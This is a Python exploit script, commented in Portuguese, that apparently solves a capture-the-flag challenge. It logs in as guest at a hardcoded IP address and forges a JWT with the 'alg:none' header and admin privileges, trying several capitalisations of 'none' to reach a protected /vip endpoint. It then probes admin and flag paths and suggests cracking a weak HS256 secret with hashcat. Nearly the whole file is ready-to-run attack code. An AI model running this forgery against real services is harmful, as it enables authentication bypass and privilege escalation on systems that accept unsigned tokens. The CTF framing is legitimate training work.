#!/usr/bin/env python3
"""
CTF — Bilheteria VIP: JWT alg:none forgery
Estratégia:
  1. Login como guest → pega JWT válido
  2. Decodifica header + payload
  3. Troca alg para "none", eleva role/user para admin
  4. Remonta token sem assinatura (header.payload.)
  5. Acessa /vip com o token forjado → flag
"""

import sys
import json
import base64
import requests

TARGET = "http://98.94.69.132:32449"

# ──────────────────────────────────────────────
# Helpers
# ──────────────────────────────────────────────

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

def jwt_decode_parts(token: str):
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(f"JWT malformado: {len(parts)} partes")
    header  = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return header, payload, parts[2]

# ──────────────────────────────────────────────
# Passo 1 — Login como guest
# ──────────────────────────────────────────────

print("[*] Fazendo login como guest...")
r = requests.post(
    f"{TARGET}/login",
    json={"user": "guest", "pass": "guest"},
    timeout=10,
)
print(f"    Status: {r.status_code}")
print(f"    Body  : {r.text[:300]}")

data = r.json()
token = (
    data.get("token") or
    data.get("access_token") or
    data.get("jwt") or
    (data.get("data") or {}).get("token")
)

if not token:
    print("[!] Token não encontrado. Keys:", list(data.keys()))
    sys.exit(1)

print(f"\n[+] Token original:\n    {token}\n")

# ──────────────────────────────────────────────
# Passo 2 — Inspeciona
# ──────────────────────────────────────────────

header, payload, sig = jwt_decode_parts(token)
print(f"[*] Header  : {json.dumps(header,  indent=2)}")
print(f"[*] Payload : {json.dumps(payload, indent=2)}")

# ──────────────────────────────────────────────
# Passo 3 — Forja payload elevado
# ──────────────────────────────────────────────

forged = dict(payload)

for key in ("role", "user", "username", "group", "admin", "is_admin"):
    if key in forged:
        original = forged[key]
        forged[key] = True if isinstance(forged[key], bool) else "admin"
        print(f"[*] Elevando '{key}': {original!r} -> {forged[key]!r}")

if not any(k in forged for k in ("role", "user", "username", "admin")):
    forged["role"] = "admin"
    print("[*] Campo 'role' adicionado com valor 'admin'")

# ──────────────────────────────────────────────
# Passo 4 — alg:none (variações)
# ──────────────────────────────────────────────

variants = ["none", "None", "NONE", "nOnE"]
flag_found = False

for alg_val in variants:
    header_mod = {"alg": alg_val, "typ": "JWT"}
    h = b64url_encode(json.dumps(header_mod, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(forged,     separators=(",", ":")).encode())
    forged_token = f"{h}.{p}."

    print(f"\n[*] Tentando alg='{alg_val}' ...")
    r2 = requests.get(
        f"{TARGET}/vip",
        headers={"Authorization": f"Bearer {forged_token}"},
        timeout=10,
    )
    print(f"    Status: {r2.status_code}")
    print(f"    Body  : {r2.text[:500]}")

    if r2.status_code == 200 or "flag" in r2.text.lower() or "ctf" in r2.text.lower():
        print(f"\n[+] FLAG ENCONTRADA com alg='{alg_val}'!")
        flag_found = True
        break

# ──────────────────────────────────────────────
# Passo 5 — Fallback info
# ──────────────────────────────────────────────

if not flag_found:
    print("\n[*] Verificando rotas alternativas...")
    for path in ["/", "/admin", "/flag", "/secret"]:
        try:
            r3 = requests.get(f"{TARGET}{path}", timeout=5)
            print(f"    {path} -> {r3.status_code}: {r3.text[:100]}")
        except Exception:
            pass

    print("\n[!] alg:none falhou. Proximas hipoteses:")
    print("    1. HS256 com segredo fraco → use jwt_tool.py ou hashcat")
    print("    2. Campo diferente no payload (sub, name, iss)")
    print("    3. Verifique o output acima e ajuste")
